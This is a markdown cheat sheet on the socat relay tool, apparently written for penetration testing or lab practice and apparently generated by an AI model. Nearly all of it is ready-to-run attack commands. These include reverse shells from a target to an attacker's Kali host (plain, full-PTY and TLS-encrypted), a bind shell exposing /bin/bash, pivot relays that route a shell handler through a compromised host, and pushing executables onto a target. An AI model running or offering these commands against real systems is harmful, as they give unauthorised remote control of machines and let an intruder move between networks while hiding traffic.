# socat

**Tags:** `#socat` `#network` `#shells` `#reverseShell` `#pivoting` `#relay`

Bidirectional data relay between two independent network channels. More powerful than netcat — supports TCP, UDP, UNIX sockets, TLS, PTY, and serial. Primary uses: stable TTY reverse shells, port forwarding/redirectors, and pivoting relays.

**Source:** https://linux.die.net/man/1/socat
**Install:** `sudo apt install socat`

```bash
# Listener (fully interactive PTY shell)
socat TCP-LISTEN:4444,reuseaddr FILE:`tty`,raw,echo=0
```

> [!note]
> socat's PTY mode gives the most stable interactive shell — better than `python3 -c 'pty.spawn'`. Use `socat` for shells where you need full terminal features (vim, sudo, tab completion). Requires socat on the target too.

---

## Reverse Shells

```bash
# Kali listener — full PTY
socat TCP-LISTEN:4444,reuseaddr FILE:`tty`,raw,echo=0

# Target — connect back with PTY
socat TCP:10.10.14.5:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Simple (no PTY — like nc)
# Kali
socat TCP-LISTEN:4444,reuseaddr -

# Target
socat TCP:10.10.14.5:4444 EXEC:/bin/bash
```

---

## Bind Shell

```bash
# Target — bind listener
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane

# Kali — connect
socat - TCP:10.129.14.128:4444
```

---

## TLS Encrypted Shell

```bash
# Generate cert on Kali
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
cat shell.key shell.crt > shell.pem

# Kali listener
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0,reuseaddr FILE:`tty`,raw,echo=0

# Target
socat OPENSSL:10.10.14.5:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

---

## Port Forwarding / Relay (Pivoting)

```bash
# Forward all traffic from :8080 to internal host
socat TCP-LISTEN:8080,fork TCP:172.16.5.10:80

# Relay Kali's reverse shell handler through pivot host
# On pivot host — forward :4444 to Kali:4444
socat TCP-LISTEN:4444,fork TCP:10.10.14.5:4444

# UDP relay
socat UDP-LISTEN:161,fork UDP:10.10.14.5:161
```

---

## File Transfer

```bash
# Kali sends
socat TCP-LISTEN:8000,reuseaddr < file.exe

# Target receives
socat TCP:10.10.14.5:8000 > file.exe
```

---

## Key Address Types

| Type | Example |
|------|---------|
| TCP listen | `TCP-LISTEN:4444,reuseaddr` |
| TCP connect | `TCP:10.10.14.5:4444` |
| PTY | `PTY,raw,echo=0` |
| Exec | `EXEC:/bin/bash,pty,stderr` |
| File/tty | `FILE:\`tty\`,raw,echo=0` |
| TLS listen | `OPENSSL-LISTEN:4444,cert=cert.pem,verify=0` |
| TLS connect | `OPENSSL:host:port,verify=0` |
| Fork | Add `,fork` to handle multiple connections |

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
